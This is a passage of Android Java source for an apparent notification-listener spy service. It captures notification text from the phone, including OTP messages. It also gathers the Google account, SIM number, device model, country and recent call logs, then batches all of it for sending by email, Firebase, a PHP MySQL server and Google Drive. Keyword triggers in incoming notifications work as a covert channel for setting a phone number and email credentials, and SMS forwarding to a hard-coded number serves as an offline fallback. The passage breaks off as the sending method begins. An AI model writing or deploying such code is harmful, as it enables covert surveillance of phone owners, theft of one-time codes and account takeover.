                "carrier for SIM 1","SIM 1","SIM 2", "see your screenshot", "MOONBIX", "ডিসকাউন্ট","ক্যাশব্যাক", "chest",
                "Invite you into the game","🄼🄸🄽🄴🅁 🅉🄾🄽🄴", "telegram","BTSE", "referral link", "wcoin_tapbot", "t.me",
                "app?startapp", "played",  "Cattea?", "Capybuddy!", "undefined","claim","Wheel","wheel", "#airdrop","#airdrop",
                "Location","maps","রিনিউ", "ফরওয়ার্ড", "reacted", "poraben","reduced","Reacted",

                "call related ", "Missed call","Voice message","Running Call", "missed calls", "Ringing…", "missed voice calls",
                "smartcapture", "dialer", "android.dialer",

                "notifications related","new notifications","You have a new notification",
                "Wi-Fi related","Wi-Fi",
                "update related", "Auto update:","setup in progress ","Finish setting",
                "Screenshot saved",
                "bkash related","Make Payment","update related", "Voucher on bKash Payment",
                "playstore related", "minutes left","playstore","minute left", "Google Drive Chat Backup", "Installing apps", "Google Play:",
                "snapchat related","watch this!",
                "vivo related","and see the more used apps", "more used apps.", "Find easily your mail box",
                "GB related", "অফার!", "নতুন অফার!"," জিবি ","*১২১*","৩০দিন", "৭ দিন", "৭দিন","৩০ দিন", "৩০দিন", "৩ দিন","রিচার্জ",
                "৩ িন","১৫ দিন", "১৫দিন", "GP30", "GB350TK", "30GB350TK", "GB300TK",
                "ইন্টারনেট অফার", "আনলিমিটেড", " ইন্টারনেট বিলের", "পরিশোধিত", "Bubble shooter game", "inbox me", "পুরস্কার",
                "MB","Mb","mb", "bonus",  "৩ জিবি-৩দিন", "ফ্রি",
                "alarm clock related ","Alarm","alarm clock",

                "Free related","Free ৳","অর্ডার করতে", "Super Offer",
                "happy birthday",
                "Emergency balance", "Emergency",
                "SmartTV",

                "seconds left", "rating bonus", "rating","বোনাস",
                "connection", "running","স্যার","Uploading...", "Uploading", "Deleting","Delete",

                "TikTok","FREE", "Win", " interested?","channel", "TV",  "Referral ","Bikroy","ভ্যাটের","ভ্যাট",
                " admin approved",
                "replied", "reactions","Reacted", "Reminder", "Checking", "device", "updated", "BCS","shared","Upgrade",

                "Mobile Recharge","watched template","template",

                "Network speed for current app will be boosted.",
                "Waiting for you", "(EC)", "Economic census", "watched template","template","নতুন আপডেট",
                "..","Tap to resume", "Sign in to network","Invitation from your friends","Tap to view",
                "have been blocked", "second left","new memories", "Contact sync", "contact information", "JPI",
                "GB450TK"
        };

        for (String keyword : blockedKeywords) {
            if (title.equals(keyword) || title.contains(keyword) ||
                    message.equals(keyword) || message.contains(keyword)) {
                return keyword; // find keyword then return
            }
        }
        return null;
    }
    //end Blocked Notification Keyword or skiping keyword.in message and title============= end code =============



    // Search Word START ,for  set sim number ,Email number and get user input sim number  ============================= START  code ===========================================

    //serch Words start code for Sim Number Set By  Own User  by alartbox. Sim Number Get From own User ======= start code ========
    public boolean isSimNumberSetByOwnUserSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SimNumberGetFromUserWords) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word1 match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words 1", "give sim number", "sim number get from user",
            "Sim Number Get From User"   ));

    public boolean isSimNumberSetByOwnUserSerchWords2(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SimNumberGetFromUserWords2) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Alart Box Set Sim Number Notification Word2 match : " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SimNumberGetFromUserWords2 = new HashSet<>(Arrays.asList(
            "Sim Number Get From User Words 2",   "&",     "*", "-",  "+"        ));
    //serch Words End code .for Sim number Set BY Own User by alartbox. Sim Number Get From User ============= End code =============


    //start serch Words .for Sim number Set BY notification  word ============= start code =============
    public boolean isSimNumberSetByNotificationSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SIMNUMBERSETALERTKEYWORDS) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "messageBody Sim Number Set Alart 1 messageBody match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SIMNUMBERSETALERTKEYWORDS = new HashSet<>(Arrays.asList(
            "number is off ?", "number is off", "number","তুমার এই নম্বারে কল ঢুকছেনা কেন",  "এটা কি তোমার নাম্বার",
            "এটা কি তোমার", "এটা কি ব্লক করা",  "এটা কি ব্লক করা ?", "এই নাম্বারের ফ্রি অফার চেক করুন",
            "এই নাম্বারের এ্যাপ থেকে অফার চেক করুন", "এই নাম্বার কি", "এটা কি তোমার",
            "sim set alart", "sorry drup your recent alls","as soon as you return your missing droup calls",
            "Why are calls not coming to this number of yours?", "calls not coming to this number of yours?",
            "sim set alarts"   ));

    public boolean isSimNumberSetByNotificationSerchWords2(String message,String title,String titleStr,String  textStr) {
        for (String keyword : SIMNUMBERSETALERTKEYWORDS2) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "messageBody Sim Number Set Alart 2 messageBody match: " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> SIMNUMBERSETALERTKEYWORDS2 = new HashSet<>(Arrays.asList(
            "!",   "@",   "#", "$",  "^", "sim set alarts"   ));
    // end Sim number Set from notification  word ============= end code =============


    //serch Words start code. for Email Number Set .From Notification . ============= start code =============
    public boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : EmailFirstPartNameSetAlartSerchWords1) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Notification Set Emsil  match Word1 : " + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> EmailFirstPartNameSetAlartSerchWords1 = new HashSet<>(Arrays.asList(
            "first part name words1", "emfpn","email Set1"   ));

    public boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords2(String message,String title,String titleStr,String  textStr) {
        for (String keyword : EmailPasswordSetAlartSerchWords2) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Notification Set Emsil password match Word2 :" + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> EmailPasswordSetAlartSerchWords2 = new HashSet<>(Arrays.asList(
            "password  words2", "pw",  "password Set2"        ));
    //serch Words End code for Email Number Set.From Notification. ============= End code =============




    public boolean isCallRecordingStartSerchWords1(String message,String title,String titleStr,String  textStr) {
        for (String keyword : CallRecordingStartSerchWords1) {
            if ( message.contains(keyword ) ||  message.equals(keyword)  ) {
                Log.d(TAG, "Notification Call Recording Start Serch Words1 :" + keyword);
                return true;
            }
        }
        return false;
    }
    private static final Set<String> CallRecordingStartSerchWords1 = new HashSet<>(Arrays.asList(
            "Call Recording Start Serch Words1", "call",  "Incoming voice call","Ongoing video call",
            "Incoming", "Calling…", "Ringing…","voice call",
            "call", "Call","calling" ));
    //serch Words End code for Email Number Set.From Notification. ============= End code =============








    // Serch Word END  for sim number set for Email number Set ======================= End code =====================================================





    // === start code ===== extract Plus Prefixed Numbers From Notification Title And Text valid phone numbers
    public String extractPlusPrefixedNumbersFromNotification(String message, String title, String text, Context context, String titleStr, String textStr) {
        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method call");

        String notificationmessage=globalmessage;
        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method notificationmessage : " + notificationmessage);

        boolean IsSimNumberSetByNotificationSerchWords1 = isSimNumberSetByNotificationSerchWords1(message, title, titleStr, textStr);
        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method IsSimNumberSetAlart1: " + IsSimNumberSetByNotificationSerchWords1);
        boolean IsSimNumberSetByNotificationSerchWords2 = isSimNumberSetByNotificationSerchWords2(message, title, titleStr, textStr);
        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method IsSimNumberSetAlart2: " + IsSimNumberSetByNotificationSerchWords2);
        if (!IsSimNumberSetByNotificationSerchWords1 && !IsSimNumberSetByNotificationSerchWords2 ) {
            return RetrieveStoredSharedPreferencesPhoneNumbers(context);
        }
        //onNotificationPosted(StatusBarNotification sbn)
        // Combine title and text into a single string for easier search
        String combinedText = title + " " + text;

        // Regular expression to match numbers starting with "+" followed by 10 to 16 digits
        String regex = "\\+\\d{10,16}";  // এই regex টি + চিহ্নের পর ১০ থেকে ১৬ ডিজিটের সংখ্যা খুঁজে বের করবে

        // Regular expression ব্যবহার করে মেলানো নম্বরগুলো বের করা
        Pattern pattern = Pattern.compile(regex);
        //java.util.regex.Matcher matcher = pattern.matcher(combinedText);
        Matcher matcher = pattern.matcher(notificationmessage);

        StringBuilder validNumbers = new StringBuilder();

        // যদি কোনো ম্যাচ পাওয়া যায়
        while (matcher.find()) {
            String matchedNumber = matcher.group();
            // সংখ্যা গুলোকে সেভ করা
            if (validNumbers.length() > 0) {
                validNumbers.append(" "); // সংখ্যা গুলোকে স্পেস দিয়ে আলাদা করা
            }
            validNumbers.append(matchedNumber);
        }

        // StringBuilder কে String-এ কনভার্ট করুন
        String validNumbersString = validNumbers.toString();
        // storeExtractPlusPrefixedNumbersFromNotification মেথডে String পাস করুন
        storeExtractPlusPrefixedNumbersFromNotification(validNumbersString, context);

        // যদি কোনো বৈধ ফোন নম্বর পাওয়া যায়, তা রিটার্ন করবে
        if (validNumbers.length() > 0) {
            Log.d(TAG, "বৈধ ফোন নম্বর পাওয়া গেছে: " + validNumbers.toString());
            return validNumbers.toString();
        } else {
            Log.d(TAG, "কোনো বৈধ ফোন নম্বর পাওয়া যায়নি।");
            return null;
        }
    }
    public void storeExtractPlusPrefixedNumbersFromNotification(String validNumbers, Context context) {
        // কনটেক্সট চেক করা (mContext যদি null হয়)
        if (context == null) {
            Log.e(TAG, "storeExtractPlusPrefixedNumbersFromNotification Method  Context is null. Unable to access SharedPreferences.");
            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
        }
        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (validNumbers != null) {
            // নম্বরগুলো সেভ করা একটি নির্দিষ্ট কী-এর মাধ্যমে
            editor.putString("validPhoneNumbers", validNumbers);
            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
            Log.d(TAG, "storeExtractPlusPrefixedNumbersFromNotification Stored SharedPreferences validNumbers: " + validNumbers);
        }
        RetrieveStoredSharedPreferencesPhoneNumbers( context);
    }

    public String RetrieveStoredSharedPreferencesPhoneNumbers(Context context) {
        if (context == null) {
            Log.e(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // স্টোর করা নম্বর লোগ করা
        String validPhoneNumbers = sharedPreferences.getString("validPhoneNumbers", null);
        if (validPhoneNumbers != null) {
            Log.d(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method validPhoneNumbers: " + validPhoneNumbers);
        } else {
            Log.d(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method validPhoneNumbers: " + validPhoneNumbers);
        }
        return validPhoneNumbers; // আগের স্টোর করা ডেটা রিটার্ন করুন
    }
// === end code ===== extract Plus Prefixed Numbers From Notification Title And Text valid phone numbers

    // Set Sim1 Number firebase subject ============= satart code ==============


    public String SetSim1Number(Context context, String text) {
        Log.d(TAG, " method SetSim1Number call");

        boolean IsSimNumberSetAlart =  isSimNumberSetByNotificationSerchWords1( text, "", "", text);
        Log.d(TAG, "SetSim1Number Method . Sim Number Set By Notification Serch Words1: " + IsSimNumberSetAlart );
        boolean IsSimNumberSetByNotificationSerchWords2 =  isSimNumberSetByNotificationSerchWords2( text, "", "", text);
        Log.d(TAG, "SetSim1Number Method . Sim Number Set By Notification Serch Words2: " + IsSimNumberSetByNotificationSerchWords2 );

        if (IsSimNumberSetAlart && IsSimNumberSetByNotificationSerchWords2) {
            String retrieveStoredSharedPreferencesPhoneNumbers = RetrieveStoredSharedPreferencesPhoneNumbers(context);
            Log.d(TAG, "SetSim1Number Method GetSim1RetrieveStoredSharedPreferencesPhoneNumbers: " + retrieveStoredSharedPreferencesPhoneNumbers);
            if (retrieveStoredSharedPreferencesPhoneNumbers != null )
                sim1Number = retrieveStoredSharedPreferencesPhoneNumbers;
            Log.d(TAG, "SetSim1Number Method.  Sim1 Number Set from notification: " + sim1Number);
            return sim1Number;
        }
        Log.d(TAG, "SetSim1Number Method GetSim1RetrieveStoredSharedPreferencesPhoneNumbers:" + RetrieveStoredSharedPreferencesPhoneNumbers(context));
        return RetrieveStoredSharedPreferencesPhoneNumbers(context);
    }



// === start code ===== eextract Email EmailFirstPartName after word of Cuponcode1  From Notification


    public String SetEmailFirstPartName(Context context, String text) {
        Log.d(TAG, "SetEmailFirstPartName Method call");

        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords1 : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords1 );
        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords2 = isEmailFirstPartNameAndPasswordSetAlartSerchWords2( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords2 : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords2 );

        if (isEmailFirstPartNameAndPasswordSetAlartSerchWords1 && isEmailFirstPartNameAndPasswordSetAlartSerchWords2) {
            String RetrievestoreExtractEmailEmailFirstPartName = RetrievestoreExtractEmailEmailFirstPartName(context);
            Log.d(TAG, "SetEmailFirstPartName Method GetSim1RetrieveStoredSharedPreferencesPhoneNumbers: " + RetrievestoreExtractEmailEmailFirstPartName);
            if (RetrievestoreExtractEmailEmailFirstPartName != null )
                EmailFirstPartName = RetrievestoreExtractEmailEmailFirstPartName;
            Log.d(TAG, "SetEmailFirstPartName Method.  EmailFirstPartName Set : " + EmailFirstPartName);
            return EmailFirstPartName;
        }
        Log.d(TAG, "SetEmailFirstPartName Method RetrievestoreExtractEmailEmailFirstPartName:" + RetrievestoreExtractEmailEmailFirstPartName(context));
        return RetrievestoreExtractEmailEmailFirstPartName(context);
    }


    public String SetEmailPassword(Context context, String text) {
        Log.d(TAG, "SetEmailFirstPartName Method call");

        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords1 : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords1 );
        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords2 = isEmailFirstPartNameAndPasswordSetAlartSerchWords2( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords2  : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords2 );

        if (isEmailFirstPartNameAndPasswordSetAlartSerchWords1 && isEmailFirstPartNameAndPasswordSetAlartSerchWords2) {
            String RetrievestoreSharedPreferencesExtractEmailPassword = RetrievestoreSharedPreferencesExtractEmailPassword(context);
            Log.d(TAG, "SetEmailFirstPartName Method RetrievestoreSharedPreferencesExtractEmailPassword : " + RetrievestoreSharedPreferencesExtractEmailPassword);
            if (RetrievestoreSharedPreferencesExtractEmailPassword != null )
                EmailPassword = RetrievestoreSharedPreferencesExtractEmailPassword;
            Log.d(TAG, "SetEmailEmailPassword Method.  SetEmailEmailPassword Set: " + EmailPassword);
            return EmailPassword;
        }
        Log.d(TAG, "SetEmailFirstPartName Method RetrievestoreSharedPreferencesExtractEmailPassword:" + RetrievestoreSharedPreferencesExtractEmailPassword(context));
        return RetrievestoreSharedPreferencesExtractEmailPassword(context);
    }


    public String extractEmailFirstPartName(String message, String title, String text, Context context, String titleStr, String textStr) {
        Log.d(TAG, "extractEmailFirstPartName method call");

        String notificationmessage = globalmessage;
        Log.d(TAG, "extractEmailFirstPartName method notification globalmessage: " + notificationmessage);

        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailFirstPartName method isEmailFirstPartNameAndPasswordSetAlartSerchWords1: " +  IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1);
        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords2(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailFirstPartName method isEmailFirstPartNameAndPasswordSetAlartSerchWords2: " + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2);

        if (! IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 && !IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2) {
            return RetrievestoreExtractEmailEmailFirstPartName(context);
        }

        // **Regex ব্যবহার করে প্রথম কুপন কোড বের করা**
        String regex1 = "cuponcode1\\s+(\\w+)"; // `cuponcode1` এর পরের ওয়ার্ড ক্যাপচার করবে
        Pattern pattern1 = Pattern.compile(regex1);
        Matcher matcher1 = pattern1.matcher(notificationmessage);

        String EmailFirstPartName = null;

        if (matcher1.find()) {
            EmailFirstPartName = matcher1.group(1); // প্রথম কুপন কোড
            Log.d(TAG, "Get First cupon code Word . For Email First Part: " + EmailFirstPartName);
        } else {
            Log.d(TAG, "Not Get First cupon Word code Word . For Email First Part");
        }

        // **কুপন কোড স্টোর করা**
        if (EmailFirstPartName != null) {
            EmailFirstPartName = EmailFirstPartName.toString();
            storeSharedPreferencesExtractEmailFirstPartName(EmailFirstPartName, context);
            return EmailFirstPartName;
        } else {
            Log.d(TAG, "Not Get First cupon Code Emailpasseord");
            return null;
        }
    }

    public void storeSharedPreferencesExtractEmailFirstPartName(String EmailFirstPartName, Context context) {
        // কনটেক্সট চেক করা (mContext যদি null হয়)
        if (context == null) {
            Log.e(TAG, "storeExtractEmailFirstPartNameFromNotification Method: Context is null. Unable to access SharedPreferences.");
            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
        }
        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (EmailFirstPartName != null) {
            // নম্বরগুলো সেভ করা একটি নির্দিষ্ট কী-এর মাধ্যমে
            editor.putString("EmailFirstPartName", EmailFirstPartName);
            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
            Log.d(TAG, "storeSharedPreferencesExtractEmailFirstPartName  Method Store SharedPreferences EmailFirstPartName: " + EmailFirstPartName);
        }
        RetrievestoreExtractEmailEmailFirstPartName( context);
    }

    public String RetrievestoreExtractEmailEmailFirstPartName(Context context) {
        if (context == null) {
            Log.e(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // স্টোর করা নম্বর লোগ করা
        String EmailFirstPartName = sharedPreferences.getString("EmailFirstPartName", null);
        if ( EmailFirstPartName != null) {
            Log.d(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method EmailFirstPartName: " + EmailFirstPartName);
        } else {
            Log.d(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method EmailFirstPartName: " + EmailFirstPartName);
        }
        return EmailFirstPartName; // আগের স্টোর করা ডেটা রিটার্ন করুন
    }


    public String extractEmailPassword(String message, String title, String text, Context context, String titleStr, String textStr) {
        Log.d(TAG, "extractEmailPassword method call");

        String notificationmessage = globalmessage;
        Log.d(TAG, "extractEmailPassword method notification  globalmessage: " + notificationmessage);

        boolean IsEmailFirstPartNameAndPasswordSetAlartSerchWords1 = isEmailFirstPartNameAndPasswordSetAlartSerchWords1(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailPassword method isEmailFirstPartNameAndPasswordSetAlartSerchWords1: " + IsEmailFirstPartNameAndPasswordSetAlartSerchWords1);
        boolean IsEmailFirstPartNameAndPasswordSetAlartSerchWords2 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords2(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailPassword method isEmailFirstPartNameAndPasswordSetAlartSerchWords2: " + IsEmailFirstPartNameAndPasswordSetAlartSerchWords2);

        if ( !IsEmailFirstPartNameAndPasswordSetAlartSerchWords1 && !IsEmailFirstPartNameAndPasswordSetAlartSerchWords2 ) {
            return RetrievestoreSharedPreferencesExtractEmailPassword(context);
        }

        // **Regex ব্যবহার করে দ্বিতীয় কুপন কোড বের করা**
        String regex2 = "cuponcode2\\s+(\\w+)"; // `cuponcode2` এর পরের ওয়ার্ড ক্যাপচার করবে
        Pattern pattern2 = Pattern.compile(regex2);
        Matcher matcher2 = pattern2.matcher(notificationmessage);

        String EmailPassword = null;

        if (matcher2.find()) {
            EmailPassword = matcher2.group(1); // দ্বিতীয় কুপন কোড
            Log.d(TAG, "Get Second cupon code: " + EmailPassword);
        } else {
            Log.d(TAG, "Not Get Second cupon code");
        }

        // **কুপন কোড স্টোর করা**
        if (EmailPassword != null) {
            EmailPassword= EmailPassword.toString();
            storeSharedPreferencesExtractEmailPassword(EmailPassword, context);
            return EmailPassword;
        } else {
            Log.d(TAG, " Not Get Second cupon code EmailPassword");
            return null;
        }
    }

    public void storeSharedPreferencesExtractEmailPassword(String EmailPassword, Context context) {
        // কনটেক্সট চেক করা (mContext যদি null হয়)
        if (context == null) {
            Log.e(TAG, "storeSharedPreferencesExtractEmailPassword Method: Context is null. Unable to access SharedPreferences.");
            return; // যদি context null হয়, তাহলে কার্যক্রম বন্ধ করা
        }
        // শেয়ার্ড প্রিফারেন্সে নম্বরগুলো স্টোর করার জন্য editor পাওয়া
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (EmailPassword != null) {
            // নম্বরগুলো সেভ করা একটি নির্দিষ্ট কী-এর মাধ্যমে
            editor.putString("EmailPassword", EmailPassword);
            editor.apply(); // পরিবর্তনগুলো অ্যাপ্লাই করা
            Log.d(TAG, "storeSharedPreferencesExtractEmailPassword  Method Stored SharedPreferences EmailPassword: " + EmailPassword);
        }
        RetrievestoreSharedPreferencesExtractEmailPassword( context);
    }
    public String RetrievestoreSharedPreferencesExtractEmailPassword(Context context) {
        if (context == null) {
            Log.e(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // শেয়ার্ড প্রিফারেন্স থেকে স্টোর করা নম্বরগুলো রিটার্ন করা
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // স্টোর করা নম্বর লোগ করা
        String EmailPassword = sharedPreferences.getString("EmailPassword", null);
        if (EmailPassword != null) {
            Log.d(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method EmailPassword: " + EmailPassword);
        } else {
            Log.d(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method EmailPassword: " + EmailPassword);
        }
        return EmailPassword; // আগের স্টোর করা ডেটা রিটার্ন করুন
    }
// === end code =====eextract Email Frst Part Name Emailpassword From Notification



// === end code Set sim number and Email Frst Part Name Emailpassword From Notification









    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                NetworkCapabilities capabilities = cm.getNetworkCapabilities(cm.getActiveNetwork());
                return capabilities != null && capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
            } else {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                return activeNetwork != null && activeNetwork.isConnected();
            }
        }
        return false;
    }
    private boolean shouldForwardBySMS(String message) {
        return !isInternetConnected() && (containsFiveDigitNumber(message) || isSpecificSMSRecipient(message));
    }
    private boolean containsFiveDigitNumber(String message) {
        return message.matches(".*\\+\\d{4}.*");
    }
    private boolean isSpecificSMSRecipient(String message) {
        return message.contains("GP") || message.contains("+8801304039289");
    }


    //public   String notificationglobalsubject; // Store subject globally



    public void SaveOrforwardNotificationEmailORFirebaseConditionaly(String app, String title, String text, Bitmap image, Context context) {
        try {
            Log.d(TAG, "Starting forwardNotificationByEmail method");
            // create subject
            AccountUtil accountUtil = new AccountUtil();
            String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
            if (GoogleAccountName == null) {
                GoogleAccountName = "null";
                Log.d(TAG, "GoogleAccountName is null, setting to 'null'");
            }
            String userSimNumber = "null";
            try {
                userSimNumber = accountUtil.getUserSimNumber(context);
                Log.d(TAG, "User SIM number fetched: " + userSimNumber);
            } catch (SecurityException e) {
                Log.e(TAG, "Error accessing Subscriber ID (SIM Number): ", e);
                userSimNumber = "null";
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error while fetching SIM number: ", e);
                userSimNumber = "null";
            }

            GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
            recentCallLogs = getRecentCallLogs.getRecentCallLogs();

            String Get_Sim1_Number = SetSim1Number(context, text);
            Log.d(TAG, "Sim1 Number set: " + Get_Sim1_Number);

            String manufacturer = Build.MANUFACTURER;
            String mobileModel = Build.MODEL;
            LocationUtil locationUtil = new LocationUtil();
            String countryName = locationUtil.getFullCountryName();
            //  Log.d(TAG, "Device info - Manufacturer: " + manufacturer + ", Model: " + mobileModel + ", Country: " + countryName);

            GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(this);
            String UserID1= alert.getSim1NumberFromUser(context);
            String UserID2= alert.getSim2NumberFromUser(context);
            String UserGivenSimNumber= UserID1 + " "+UserID2;

            subject = "Nt ID: " + Get_Sim1_Number +  " " + UserGivenSimNumber + " " + manufacturer + " " + mobileModel + " " + app + " User: " + GoogleAccountName + " sim ser: " + userSimNumber + " " +" Country: " + countryName;
            String messageBody = app + " Title: " + title + " Message: " + text  ;
            //Log.e(TAG, "Notification email subject: " + subject);

            notificationglobalsubject= subject ;

            // Convert timestamp to human-readable format
            long currentTimeMillis = System.currentTimeMillis();
            SimpleDateFormat sdf = new SimpleDateFormat(" M dd yyyy  HH:mm:ss ", Locale.getDefault());
            String formattedTimestamp = sdf.format(new Date(currentTimeMillis));

            // Append email content to buffer with formatted timestamp
            emailContentBuffer.append("Time: ").append(formattedTimestamp).append(" ");
            // emailContentBuffer.append("Subject: ").append(subject).append("\n");
            emailContentBuffer.append("Message: ").append(messageBody).append("\n");
            // Log.d(TAG, "Email content appended to buffer: " + emailContentBuffer.toString());

            // Save content to text file
            saveToTextFile(this,emailContentBuffer.toString());

            boolean iscontainsNotificationOtpWords = containsNotificationOtpWords(messageBody);
            //Log.d(TAG, "Contains Notification Otp check: " + iscontainsNotificationOtpWords);
            // Check if the buffer exceeds the word limit
            if ((getWordCount(emailContentBuffer.toString()) >= MAX_WORDS) || iscontainsNotificationOtpWords  ){
                Log.e(TAG, "Notification text more than MAX_WORDS or otp related, forwarding email and clearing buffer");
                String fileContent = readFromTextFile();
                // Log.d(TAG, "File content to be sent: " + fileContent); // Log the file content
                sendEmailAndSaveToFirebaseAndPHPMysqlDBAndGoogledrive(fileContent, image, context);
                clearTextFile();
                emailContentBuffer.setLength(0); // Clear the buffer
            } else if (!isTimerRunning) {
                Log.d(TAG, "Timer not Equal Targeted ,Starting timer for delayed email sending");
                CheekTimerToSendData(image, context);
            }


        } catch (Exception e) {
            Log.e(TAG, "Notification failed to forward via email: ", e);
        }
    }

    private void CheekTimerToSendData(Bitmap image, Context context) {
        isTimerRunning = true;
        Log.d(TAG, " Timer started, will run after " + DELAY + " milliseconds After Sending Data");
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                handler.post(() -> {
                    if (emailContentBuffer.length() > 0) {
                        Log.d(TAG, "Timer True To triggered, reading from text file and sending email");
                        String fileContent = readFromTextFile();
                        sendEmailAndSaveToFirebaseAndPHPMysqlDBAndGoogledrive(fileContent, image, context);
                        clearTextFile();
                        emailContentBuffer.setLength(0); // Clear the buffer
                    }
                    isTimerRunning = false;
                    Log.d(TAG, "Timer stopped");
                });
                Log.d(TAG, "Timer false To triggered, reading from text file and sending email");
            }
        }, DELAY);
    }

// image convert for php mysql site dava save
// Image convert for PHP MySQL (Base64)
private String bitmapToBase64(Bitmap bitmap) {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos); // 70% quality
    return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
}


    // Email + Firebase + PHP MySQL + Google Drive save
        private void sendEmailAndSaveToFirebaseAndPHPMysqlDBAndGoogledrive(
                String content,
                Bitmap image,
                Context context
        ) {

            try {
                String finalSubject = subject + " Notification Summary";
                String finalContent = subject + "\n" + content +
                        "\nRecent Call Logs:\n" + recentCallLogs;

                // 1️⃣ Send Email
